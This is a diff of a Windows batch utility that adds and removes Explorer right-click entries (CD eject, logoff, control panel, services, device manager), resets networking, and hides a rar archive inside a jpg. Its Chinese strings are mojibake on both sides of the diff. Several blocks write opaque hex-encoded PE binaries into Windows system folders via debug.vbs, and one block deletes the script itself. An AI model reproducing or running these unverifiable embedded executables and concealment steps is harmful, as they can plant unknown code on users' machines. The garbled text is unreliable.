-echo   ©¦ ±¾Ò³¸÷ÏîÊı×Öºó¼Óa¾ùÎªÈ¡Ïû²Ù×÷,Èç1a»ò2aµÈ ©¦
-echo   ¨t©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨s
-set /p list2=  ÇëÊäÈëÑ¡Ïî:
+echo         â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
+echo   â•­â”€â”€â”¤        å³  é”®  å…‰  é©±        â”œâ”€â”€â•®
+echo   â”‚    â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯    â”‚
+echo   â”‚                                          â”‚
+echo   â”‚  1ã€å³é”®æ·»åŠ å…³é—­å…‰é©±                     â”‚
+echo   â”‚                                          â”‚
+echo   â”‚  2ã€å³é”®æ·»åŠ æ‰“å¼€å…‰é©±                     â”‚
+echo   â”‚                                          â”‚
+echo   â”‚  0ã€è¿”å›ä¸Šå±‚èœå•                         â”‚
+echo   â”‚                                          â”‚
+echo   â”‚  eã€é€€å‡º                                 â”‚
+echo   â”‚                                          â”‚
+echo   â”‚ æœ¬é¡µå„é¡¹æ•°å­—ååŠ aå‡ä¸ºå–æ¶ˆæ“ä½œ,å¦‚1aæˆ–2aç­‰ â”‚
+echo   â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯
+set /p list2=  è¯·è¾“å…¥é€‰é¡¹:
 if "%list2%"=="1" goto list1_1
 if "%list2%"=="1a" goto list1_1a
 if "%list2%"=="2" goto list1_2
@@ -3500,16 +3500,16 @@ if "%list2%"=="2a" goto list1_2a
 if "%list2%"=="0" goto startfjcyz
 if "%list2%"=="e" goto exit
 goto 9
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 9
 :list1_1
 MODE con: COLS=50 LINES=15
 color 4f
 cls
 echo.
-echo.ÕıÔÚÉú³ÉDLLÎÄ¼şÖĞ,Íê³Éºó×Ô¶¯ÍË³ö³ÌĞò,ÇëÉÔºò...
+echo.æ­£åœ¨ç”ŸæˆDLLæ–‡ä»¶ä¸­,å®Œæˆåè‡ªåŠ¨é€€å‡ºç¨‹åº,è¯·ç¨å€™...
 @echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
 @echo +"504500004C0105008ADB1E3C0000000000000000E0000E210B010414002A00000018000000000000981000000010000000400000000000110010000000020000040000000100010004000000000000000080000000040000A0B600000200000000001000001000000000100000100000000000001000000090370000A1000000"_>>debug.vbs
 @echo +"0050000028000000006000002C0A000000000000000000000000000000000000007000005803000000000000000000000000000000000000000000000000000000000000000000000000000000000000400200002000000090500000680000000000000000000000000000000000000000000000000000002E74657874000000"_>>debug.vbs
@@ -3825,7 +3825,7 @@ cls
 ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
 
 ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\Super Rabbit CDROM Eject]>>SHOWALL.reg
-ECHO @="¹Ø±Õ¹âÇı">>SHOWALL.reg
+ECHO @="å…³é—­å…‰é©±">>SHOWALL.reg
 
 ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\Super Rabbit CDROM Eject\command]>>SHOWALL.reg
 ECHO @=hex(2):43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,77,\>>SHOWALL.reg
@@ -3833,7 +3833,7 @@ ECHO   00,69,00,6e,00,7a,00,68,00,65,00,6e,00,67,00,5c,00,63,00,6c,00,6f,00,73,0
 ECHO   65,00,63,00,64,00,2e,00,65,00,78,00,65,00,00,00>>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\Folder\shell\Super Rabbit CDROM Eject]>>SHOWALL.reg
-ECHO @="¹Ø±Õ¹âÇı">>SHOWALL.reg
+ECHO @="å…³é—­å…‰é©±">>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\Folder\shell\Super Rabbit CDROM Eject\command]>>SHOWALL.reg
 ECHO @=hex(2):43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,77,\>>SHOWALL.reg
@@ -3845,7 +3845,7 @@ DEL /F /Q SHOWALL.reg
 
 exit
 goto 9
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 9
 :list1_1a
 MODE con: COLS=50 LINES=15
@@ -3858,17 +3858,17 @@ reg delete "HKLM\SOFTWARE\Classes\Folder\shell\Super Rabbit CDROM Eject" /f
 reg delete "HKCR\Folder\shell\Super Rabbit CDROM Eject" /f
 cls
 echo.
-echo                 ¹Ø±Õ¹âÇıÉ¾³ı³É¹¦!
+echo                 å…³é—­å…‰é©±åˆ é™¤æˆåŠŸ!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto list9_9
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 9
 :list1_2
 MODE con: COLS=50 LINES=15
 cls
-echo.ÕıÔÚÉú³ÉÖĞ£¬ÇëÉÔºò...
+echo.æ­£åœ¨ç”Ÿæˆä¸­ï¼Œè¯·ç¨å€™...
 @echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
 @echo +"8F8AF9DBCBEB9788CBEB9788CBEB978848F79988CAEB9788A2F49E88CAEB978822F49A88CAEB978852696368CBEB97880000000000000000504500004C01030031CFB3450000000000000000E0000F010B010600002000000020000000000000B811000000100000003000000000400000100000001000000400000001000000"_>>debug.vbs
 @echo +"04000000000000000050000000100000991F0100020000000000100000100000000010000010000000000000100000000000000000000000641D00002800000000400000EC0800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@@ -4039,7 +4039,7 @@ cls
 ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\Folder\shell\opencd]>>SHOWALL.reg
-ECHO @="´ò¿ª¹âÇı">>SHOWALL.reg
+ECHO @="æ‰“å¼€å…‰é©±">>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\Folder\shell\opencd\command]>>SHOWALL.reg
 ECHO @=hex(2):43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,77,\>>SHOWALL.reg
@@ -4047,7 +4047,7 @@ ECHO   00,69,00,6e,00,7a,00,68,00,65,00,6e,00,67,00,5c,00,6f,00,70,00,65,00,6e,0
 ECHO   63,00,64,00,2e,00,65,00,78,00,65,00,00,00>>SHOWALL.reg
 
 ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\opencd]>>SHOWALL.reg
-ECHO @="´ò¿ª¹âÇı">>SHOWALL.reg
+ECHO @="æ‰“å¼€å…‰é©±">>SHOWALL.reg
 
 ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\opencd\command]>>SHOWALL.reg
 ECHO @=hex(2):43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,77,\>>SHOWALL.reg
@@ -4059,7 +4059,7 @@ DEL /F /Q SHOWALL.reg
 
 exit
 goto 9
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 9
 :list1_2a
 MODE con: COLS=50 LINES=15
@@ -4069,18 +4069,18 @@ reg delete "HKCR\Folder\shell\opencd" /f
 reg delete "HKLM\SOFTWARE\Classes\Folder\shell\opencd" /f
 cls
 echo.
-echo                 ´ò¿ª¹âÇıÉ¾³ı³É¹¦!
+echo                 æ‰“å¼€å…‰é©±åˆ é™¤æˆåŠŸ!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto list9_9
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 10
 :list10_10
 MODE con: COLS=50 LINES=15
 color 5f
 cls
-echo.ÕıÔÚÉú³ÉÖĞ£¬ÇëÉÔºò...
+echo.æ­£åœ¨ç”Ÿæˆä¸­ï¼Œè¯·ç¨å€™...
 @echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
 @echo +"8F8AF9DBCBEB9788CBEB9788CBEB978848F79988CAEB9788A2F49E88CAEB978822F49A88CAEB978852696368CBEB97880000000000000000504500004C0103006447B4450000000000000000E0000F010B0106000020000000200000000000009C11000000100000003000000000400000100000001000000400000001000000"_>>debug.vbs
 @echo +"04000000000000000050000000100000EE6B0000020000000000100000100000000010000010000000000000100000000000000000000000E41C00002800000000400000EC0800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@@ -4251,7 +4251,7 @@ cls
 ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
 
 ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\zhuxiao]>>SHOWALL.reg
-ECHO @="×¢Ïú¼ÆËã»ú">>SHOWALL.reg
+ECHO @="æ³¨é”€è®¡ç®—æœº">>SHOWALL.reg
 
 ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\zhuxiao\command]>>SHOWALL.reg
 ECHO @=hex(2):43,00,3a,00,5c,00,77,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,00,77,\>>SHOWALL.reg
@@ -4259,7 +4259,7 @@ ECHO   00,69,00,6e,00,7a,00,68,00,65,00,6e,00,67,00,5c,00,7a,00,68,00,75,00,78,0
 ECHO   69,00,61,00,6f,00,2e,00,65,00,78,00,65,00,00,00>>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\Folder\shell\zhuxiao]>>SHOWALL.reg
-ECHO @="×¢Ïú¼ÆËã»ú">>SHOWALL.reg
+ECHO @="æ³¨é”€è®¡ç®—æœº">>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\Folder\shell\zhuxiao\command]>>SHOWALL.reg
 ECHO @=hex(2):43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,77,\>>SHOWALL.reg
@@ -4270,7 +4270,7 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 exit
 goto 10
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 10
 :list10_10a
 MODE con: COLS=50 LINES=15
@@ -4282,12 +4282,12 @@ reg delete "HKCR\Folder\shell\zhuxiao" /f
 reg delete "HKLM\SOFTWARE\Classes\Folder\shell\zhuxiao" /f
 cls
 echo.
-echo                 ×¢Ïú¼ÆËã»úÉ¾³ı³É¹¦!
+echo                 æ³¨é”€è®¡ç®—æœºåˆ é™¤æˆåŠŸ!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 11
 :list11_11
 MODE con: COLS=50 LINES=15
@@ -4310,12 +4310,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo               ÒÑÌí¼ÓÌí¼Ó»òÉ¾³ı³ÌĞò!
+echo               å·²æ·»åŠ æ·»åŠ æˆ–åˆ é™¤ç¨‹åº!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 11
 :list11_11a
 MODE con: COLS=50 LINES=15
@@ -4323,12 +4323,12 @@ cls
 reg delete "HKCR\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Dezinstall" /f
 cls
 echo.
-echo               ÒÑÈ¡ÏûÌí¼Ó»òÉ¾³ı³ÌĞò!
+echo               å·²å–æ¶ˆæ·»åŠ æˆ–åˆ é™¤ç¨‹åº!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 12
 :list12_12
 MODE con: COLS=50 LINES=15
@@ -4348,12 +4348,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                 ³É¹¦Ìí¼Ó¿ØÖÆÃæ°å!
+echo                 æˆåŠŸæ·»åŠ æ§åˆ¶é¢æ¿!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 12
 :list12_12a
 MODE con: COLS=50 LINES=15
@@ -4361,12 +4361,12 @@ cls
 reg delete "HKLM\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\kzmb" /f
 cls
 echo.
-echo                  ÒÑÈ¡Ïû¿ØÖÆÃæ°å!
+echo                  å·²å–æ¶ˆæ§åˆ¶é¢æ¿!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 13
 :list13_13
 MODE con: COLS=50 LINES=15
@@ -4389,12 +4389,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                   ³É¹¦Ìí¼Ó·şÎñ!
+echo                   æˆåŠŸæ·»åŠ æœåŠ¡!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 13
 :list13_13a
 MODE con: COLS=50 LINES=15
@@ -4402,12 +4402,12 @@ cls
 reg delete "HKCR\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\services" /f
 cls
 echo.
-echo                  ÒÑÈ¡ÏûÓÒ¼ü·şÎñ!
+echo                  å·²å–æ¶ˆå³é”®æœåŠ¡!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 14
 :list14_14
 MODE con: COLS=50 LINES=15
@@ -4429,12 +4429,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                  ³É¹¦Ìí¼Ó×é²ßÂÔ!
+echo                  æˆåŠŸæ·»åŠ ç»„ç­–ç•¥!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 14
 :list14_14a
 MODE con: COLS=50 LINES=15
@@ -4442,12 +4442,12 @@ cls
 reg delete "HKCR\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\NGpEdit" /f
 cls
 echo.
-echo                 ÒÑÈ¡ÏûÓÒ¼ü×é²ßÂÔ!
+echo                 å·²å–æ¶ˆå³é”®ç»„ç­–ç•¥!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 15
 :list15_15
 MODE con: COLS=50 LINES=15
@@ -4471,12 +4471,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                ³É¹¦Ìí¼ÓÉè±¸¹ÜÀíÆ÷!
+echo                æˆåŠŸæ·»åŠ è®¾å¤‡ç®¡ç†å™¨!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 15
 :list15_15a
 MODE con: COLS=50 LINES=15
@@ -4484,38 +4484,38 @@ cls
 reg delete "HKLM\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\DevMgr" /f
 cls
 echo.
-echo                 ÒÑÈ¡ÏûÉè±¸¹ÜÀíÆ÷!
+echo                 å·²å–æ¶ˆè®¾å¤‡ç®¡ç†å™¨!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
 attrib -h -s -r -a %0
 del %0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
 
 :mark27
 @echo off
-TITLE  ÖØÖÃÍøÂç
-echo. ÊÇ·ñÖ´ĞĞÒÔÏÂ²Ù×÷£º
-echo.   ÖØÖÃ È«¾Ö£»
-echo.   ÖØÖÃ ½Ó¿Ú£¬
-echo.   ÖØÖÃ µ¥²¥µØÖ·£¬Íê³É!
-echo.   ÖØÖÃ Â·ÓÉ£¬Íê³É!
-echo.   ÖØÖÃ Windows IP ÅäÖÃ
-echo.   Ë¢ĞÂ DNS ½âÎö»º´æ¡£
-echo. ------×¢ÒâÈç¹ûÉèÖÃÁË¾²Ì¬ipµØÖ·»áÇå³ı-----
-echo. ------Çë×¢ÒâÖØÆô¼ÆËã»ú------
-echo.  °´ÈÎÒâ¼ü¼ÌĞø
+TITLE  é‡ç½®ç½‘ç»œ
+echo. æ˜¯å¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
+echo.   é‡ç½® å…¨å±€ï¼›
+echo.   é‡ç½® æ¥å£ï¼Œ
+echo.   é‡ç½® å•æ’­åœ°å€ï¼Œå®Œæˆ!
+echo.   é‡ç½® è·¯ç”±ï¼Œå®Œæˆ!
+echo.   é‡ç½® Windows IP é…ç½®
+echo.   åˆ·æ–° DNS è§£æç¼“å­˜ã€‚
+echo. ------æ³¨æ„å¦‚æœè®¾ç½®äº†é™æ€ipåœ°å€ä¼šæ¸…é™¤-----
+echo. ------è¯·æ³¨æ„é‡å¯è®¡ç®—æœº------
+echo.  æŒ‰ä»»æ„é”®ç»§ç»­
 pause >nul
 NETSH INT IP RESET
 IPCONFIG /FLUSHDNS
-echo.   Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo.   è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -4523,36 +4523,36 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 :mark28
 cls
 MODE con: COLS=50 LINES=19
-echo         ¨q©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨r
-echo   ¨q©¤©¤©È      Òş²ØÎÄ¼şµ½jpg           ©À©¤©¤¨r
-echo   ©¦    ¨t©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨s    ©¦
-echo   ©¦  Çë×¼±¸ºÃÒ»¸örarÎÄ¼şÒÔ¼°Ò»¸öjpgÍ¼Æ¬ÎÄ¼ş  ©¦
-echo   ©¦         ÎÄ¼şÃûÎñ±ØÕı³£Ò»Ğ©               ©¦
-echo   ©¦                                          ©¦
-echo   ©¦      °´ÈÎÒâ¼ü¼ÌĞø                        ©¦
-echo   ¨t©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨s
+echo         â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
+echo   â•­â”€â”€â”¤      éšè—æ–‡ä»¶åˆ°jpg           â”œâ”€â”€â•®
+echo   â”‚    â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯    â”‚
+echo   â”‚  è¯·å‡†å¤‡å¥½ä¸€ä¸ªraræ–‡ä»¶ä»¥åŠä¸€ä¸ªjpgå›¾ç‰‡æ–‡ä»¶  â”‚
+echo   â”‚         æ–‡ä»¶ååŠ¡å¿…æ­£å¸¸ä¸€äº›               â”‚
+echo   â”‚                                          â”‚
+echo   â”‚      æŒ‰ä»»æ„é”®ç»§ç»­                        â”‚
+echo   â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯
 pause >nul
-echo.¢ÙÇëÍÏÈëÍ¼ÏñÎÄ¼şºó»Ø³µ£º
+echo.â‘ è¯·æ‹–å…¥å›¾åƒæ–‡ä»¶åå›è½¦ï¼š
 set /p imagefile=
-echo.¢ÚÇëÍÏÈërarÎÄ¼şºó»Ø³µ£º
+echo.â‘¡è¯·æ‹–å…¥raræ–‡ä»¶åå›è½¦ï¼š
 set /p rarfile=
 echo.
 copy /b %imagefile% + %rarfile% %rarfile%_new.jpg
 echo.
 if errorlevel 1 goto mark28.2
-echo.Î±×°Í¼%rarfile%_new.jpgÒÑ¾­Éú³É
-echo.Ê¹ÓÃÊ±Çë½«%rarfile%_new.jpg¸üÃûÎªxx.rar¼´¿É´ò¿ª
-echo.Î±×°Í¼Íê³É..
+echo.ä¼ªè£…å›¾%rarfile%_new.jpgå·²ç»ç”Ÿæˆ
+echo.ä½¿ç”¨æ—¶è¯·å°†%rarfile%_new.jpgæ›´åä¸ºxx.rarå³å¯æ‰“å¼€
+echo.ä¼ªè£…å›¾å®Œæˆ..
 echo.
 goto mark28.1
 :mark28.2
-echo.·¢Éú´íÎó,Î±×°Í¼Éú³ÉÊ§°Ü.
